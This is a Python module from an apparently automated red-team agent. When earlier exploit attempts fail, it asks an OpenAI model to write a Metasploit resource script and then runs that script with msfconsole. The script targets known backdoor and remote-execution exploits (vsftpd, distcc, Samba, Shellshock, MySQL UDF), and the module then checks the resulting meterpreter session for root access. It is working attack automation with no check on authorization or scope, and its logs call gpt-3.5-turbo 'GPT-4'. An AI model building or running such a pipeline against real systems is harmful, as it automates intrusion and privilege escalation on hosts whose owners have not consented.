#!/usr/bin/env python3
"""
NODE 5.5: GPT FALLBACK EXPLOIT GENERATION
When Node 5 exhausts all exploits with no shell, ask GPT to generate a complete .rc file
"""

import logging
import time
import subprocess
from pathlib import Path
from typing import Dict
import os

try:
    from openai import OpenAI
except ImportError:
    OpenAI = None

# Import pwn.rc cleaner
import sys
from pathlib import Path as PathlibPath
sys.path.append(str(PathlibPath(__file__).parent.parent))
from utils.pwn_rc_cleaner import clean_pwn_rc_content, validate_pwn_rc


def node_5_5_gpt_fallback_exploit(state: Dict) -> Dict:
    """
    NODE 5.5: GPT Fallback Exploit Generation (When Node 5 fails to get shell)

    ═══════════════════════════════════════════════════════════════════════════
    PURPOSE
    ═══════════════════════════════════════════════════════════════════════════

    When Node 5 tries all selected exploits (8 exploits × 10-15 payloads = 120 attempts)
    and gets NO shell, this node:
    1. Takes target info (service, port, OS) from Node 1
    2. Sends to GPT-4 with full context
    3. GPT generates a complete pwn.rc exploitation script
    4. Saves and executes pwn.rc via msfconsole
    5. Gets meterpreter session + privilege escalation in one shot

    ═══════════════════════════════════════════════════════════════════════════
    INPUT STATE REQUIREMENTS (From Nodes 1-5)
    ═══════════════════════════════════════════════════════════════════════════

    From Node 1:
    - target: Target IP address
    - port: Target port
    - service: Service name (ftp, ssh, http, etc.)
    - os_type: Detected OS (Linux, Windows, etc.)
    - msf_client: Metasploit RPC client

    From Node 4-5:
    - lhost: Attacker IP address
    - session_dir: Path to session directory

    Optional:
    - service_version: Service version if detected
    - cve_ids: CVE IDs if provided

    ═══════════════════════════════════════════════════════════════════════════
    OUTPUT STATE UPDATES
    ═══════════════════════════════════════════════════════════════════════════

    On Success:
    - pwn_rc_generated: True
    - pwn_rc_path: Path to generated pwn.rc file
    - pwn_rc_source: "gpt_fallback" (to distinguish from normal Node 6)
    - primary_session_id: Meterpreter session ID
    - primary_session_type: "meterpreter"
    - is_root: True (if privilege escalation successful)
    - privilege_level: "high"

    On Failure:
    - pwn_rc_generated: False
    - error: Error message

    ═══════════════════════════════════════════════════════════════════════════
    """

    logger = logging.getLogger("red_agent.node_5_5")

    logger.info("═" * 80)
    logger.info("NODE 5.5: GPT FALLBACK EXPLOIT GENERATION")
    logger.info("(No shell from Node 5 - asking GPT for help)")
    logger.info("═" * 80)
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 1: VALIDATE INPUT & EXTRACT INFORMATION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 1: Extracting Target Information")
    logger.info("─" * 80)

    target = state.get("target")
    port = state.get("port")
    service = state.get("service", "unknown")
    os_type = state.get("os_type", "Linux")
    lhost = state.get("lhost")
    session_dir = state.get("session_dir")

    # Optional but helpful
    service_version = state.get("service_version", "unknown version")
    cve_ids = state.get("cve_ids", [])

    # Validate required parameters
    if not all([target, port, service]):
        logger.error("❌ Missing required parameters (target, port, service)")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "Missing required: target, port, or service"
        }

    # If lhost not set, try to get from environment
    if not lhost:
        lhost = os.getenv("METASPLOIT_LHOST", "192.168.0.187")
        logger.info(f"ℹ️  LHOST not set, using environment: {lhost}")
        state["lhost"] = lhost

    logger.info(f"✓ Target: {target}:{port}")
    logger.info(f"✓ Service: {service} ({service_version})")
    logger.info(f"✓ OS: {os_type}")
    if cve_ids:
        logger.info(f"✓ CVEs: {', '.join(cve_ids)}")
    logger.info(f"✓ LHOST (Attacker): {lhost}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2: CHECK OPENAI API & READ DEMO TEMPLATE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2: Checking OpenAI API & Reading Demo Template")
    logger.info("─" * 80)

    # Check OpenAI API key
    openai_api_key = os.getenv("OPENAI_API_KEY")
    if not openai_api_key or openai_api_key == "your_openai_api_key_here":
        logger.error("❌ OPENAI_API_KEY not set in .env file")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "OPENAI_API_KEY not configured"
        }

    if not OpenAI:
        logger.error("❌ OpenAI library not installed")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "OpenAI library not installed"
        }

    # Read demo pwn.rc template
    demo_pwn_rc = Path(__file__).parent.parent / "pwn.rc"
    if not demo_pwn_rc.exists():
        logger.error(f"❌ Demo pwn.rc template not found at {demo_pwn_rc}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Demo pwn.rc not found at {demo_pwn_rc}"
        }

    try:
        demo_content = demo_pwn_rc.read_text()
        logger.info(f"✓ Loaded demo pwn.rc template ({len(demo_content)} bytes)")
    except Exception as e:
        logger.error(f"❌ Failed to read demo pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to read demo pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2.5: REGENERATE LPORT (AVOID PORT CONFLICTS FROM NODE 5)
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2.5: Regenerating LPORT (avoid port conflicts)")
    logger.info("─" * 80)

    import random
    new_lport = random.randint(6000, 6999)  # Use different range than Node 4
    logger.info(f"✓ New LPORT for fallback attempt: {new_lport}")
    logger.info(f"  (Previous LPORT was {state.get('lport', 'unknown')}, now using {new_lport})")
    state["lport"] = new_lport
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: SEND TO GPT FOR PWN.RC GENERATION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3: Generating pwn.rc via GPT-4")
    logger.info("─" * 80)

    try:
        client = OpenAI(api_key=openai_api_key)

        cve_context = f"CVEs to consider: {', '.join(cve_ids)}" if cve_ids else "No specific CVEs provided"

        prompt = f"""You are a Metasploit resource script generator. Generate plain msfconsole commands, NOT Ruby code.

TARGET INFORMATION:
- IP Address: {target}
- Port: {port}
- Service: {service} ({service_version})
- Operating System: {os_type}

EXPLOIT WHITELISTING - Use EXACTLY these exploits:
- FTP (vsftpd): exploit/unix/ftp/vsftpd_234_backdoor with payload cmd/shell/bind_tcp
- SSH: exploit/unix/ssh_version
- distcc: exploit/unix/misc/distcc_exec with payload cmd/unix/bind_ruby
- HTTP: exploit/linux/http/apache_mod_cgi_bash_env_exec
- MySQL: exploit/linux/mysql/udf_priv_esc
- Samba: exploit/multi/samba/usermap_script

EXAMPLE OF CORRECT FORMAT (plain Metasploit resource script):
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target}
set PAYLOAD cmd/shell/bind_tcp
set LHOST {lhost}
set LPORT {state.get('lport', 4444)}
exploit -z

sleep 3

sessions -u 1
sleep 30

sessions

GENERATE YOUR SCRIPT:
- Use 'use' command to load exploit
- Use 'set' command to configure options
- Use 'exploit -z' to run in background
- Use 'sessions' to list sessions
- Use 'sessions -u <id>' to upgrade to meterpreter

CRITICAL - PLAIN TEXT ONLY:
- Generate ONLY plain Metasploit resource script commands
- NO Ruby code, NO helper functions, NO variable definitions
- Each command on a new line
- Include exploits -z, sleep, sessions commands as shown
- Use correct RHOSTS (not RHOST) from whitelist above
- Replace {target} with actual target IP
- Replace {lhost} with {lhost}
"""

        logger.info("Sending request to GPT-4...")


        logger.info("Sending request to GPT-4...")
        logger.info(f"  Target: {target}:{port}")
        logger.info(f"  Service: {service}")
        logger.info(f"  OS: {os_type}")

        response = client.chat.completions.create(
            model="gpt-3.5-turbo",
            messages=[
                {
                    "role": "system",
                    "content": "You are an expert Metasploit framework specialist. Generate ONLY plain Metasploit resource script commands (use, set, exploit, sessions, sleep). NO Ruby code, NO helper functions, NO definitions. Each command on new line."
                },
                {"role": "user", "content": prompt}
            ],
            temperature=0.2,
            max_tokens=4000
        )

        generated_pwn_rc = response.choices[0].message.content.strip()
        logger.info(f"✓ GPT-4 generated pwn.rc ({len(generated_pwn_rc)} bytes)")

    except Exception as e:
        logger.error(f"❌ GPT-4 generation failed: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"GPT-4 generation failed: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3.5: CLEAN PWN.RC CONTENT (Remove Markdown Formatting)
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3.5: Cleaning pwn.rc content")
    logger.info("─" * 80)

    try:
        generated_pwn_rc = clean_pwn_rc_content(generated_pwn_rc)
        logger.info(f"✓ Cleaned pwn.rc content ({len(generated_pwn_rc)} bytes after cleanup)")

        # Validate the content
        is_valid, error_msg = validate_pwn_rc(generated_pwn_rc)
        if not is_valid:
            logger.warning(f"⚠️  Content validation warning: {error_msg}")
        else:
            logger.info(f"✓ Content validation passed")

    except Exception as e:
        logger.warning(f"⚠️  Content cleaning warning (continuing anyway): {e}")

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 4: SAVE PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 4: Saving Generated pwn.rc")
    logger.info("─" * 80)

    try:
        # Use session_dir if available, otherwise create exploitations folder
        if session_dir:
            exploit_dir = Path(session_dir)
        else:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            exploitations_dir = Path(__file__).parent.parent / "exploitations"
            exploitations_dir.mkdir(exist_ok=True)
            exploit_dir = exploitations_dir / f"node_5_5_gpt_{target}_{port}_{timestamp}"
            exploit_dir.mkdir(exist_ok=True)

        pwn_rc_path = exploit_dir / "generated_pwn.rc"
        pwn_rc_path.write_text(generated_pwn_rc)
        pwn_rc_path.chmod(0o755)  # Make executable
        logger.info(f"✓ Saved pwn.rc to {pwn_rc_path}")

    except Exception as e:
        logger.error(f"❌ Failed to save pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to save pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 5: EXECUTE PWN.RC VIA MSFCONSOLE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 5: Executing pwn.rc via msfconsole")
    logger.info("─" * 80)

    logger.info(f"Running: msfconsole -q -r {pwn_rc_path}")
    logger.info("Attempting exploitation with GPT-generated script...")
    logger.info("")

    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(pwn_rc_path)],
            capture_output=False,  # Show output directly
            timeout=300  # 5 minute timeout
        )

        logger.info("")
        logger.info("✓ pwn.rc execution completed")
        logger.info("Waiting for sessions to be registered...")

        # Wait for sessions to be available in MSF RPC
        time.sleep(5)

    except subprocess.TimeoutExpired:
        logger.warning("⚠️  msfconsole execution timed out (still checking sessions...)")
        time.sleep(5)
    except Exception as e:
        logger.error(f"❌ Failed to execute msfconsole: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to execute msfconsole: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 6: CHECK FOR METERPRETER SESSION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 6: Checking for Meterpreter Session")
    logger.info("─" * 80)

    msf_client = state.get("msf_client")
    if not msf_client:
        logger.warning("⚠️  MSF client not available, skipping session check")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "gpt_fallback",
            "note": "pwn.rc executed, check msfconsole for meterpreter session"
        }

    try:
        time.sleep(5)  # Wait for sessions to be registered
        sessions = msf_client.sessions.list

        meterpreter_sessions = [
            (sid, info) for sid, info in sessions.items()
            if info.get('type') == 'meterpreter'
        ]

        if meterpreter_sessions:
            # Get the latest/highest session ID (most recent)
            meterpreter_sid = max([sid for sid, _ in meterpreter_sessions])
            logger.info(f"✅ Found meterpreter session: {meterpreter_sid}")

            # Check if it's root
            try:
                session = msf_client.sessions.session(meterpreter_sid)
                uid_output = session.run_command("id")
                is_root = "uid=0(root)" in uid_output
                logger.info(f"   User: {'root' if is_root else 'non-root'}")
                logger.info(f"   Output: {uid_output.strip()}")
            except:
                is_root = False

            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "gpt_fallback",
                "primary_session_id": meterpreter_sid,
                "primary_session_type": "meterpreter",
                "is_root": is_root,
                "privilege_level": "high" if is_root else "low",
                "next_phase": "post_exploitation"
            }
        else:
            logger.warning("⚠️  No meterpreter session found after execution")
            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "gpt_fallback",
                "note": "pwn.rc executed but no meterpreter session detected"
            }

    except Exception as e:
        logger.warning(f"⚠️  Error checking sessions: {e}")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "gpt_fallback",
            "note": f"pwn.rc executed, error checking sessions: {str(e)}"
        }
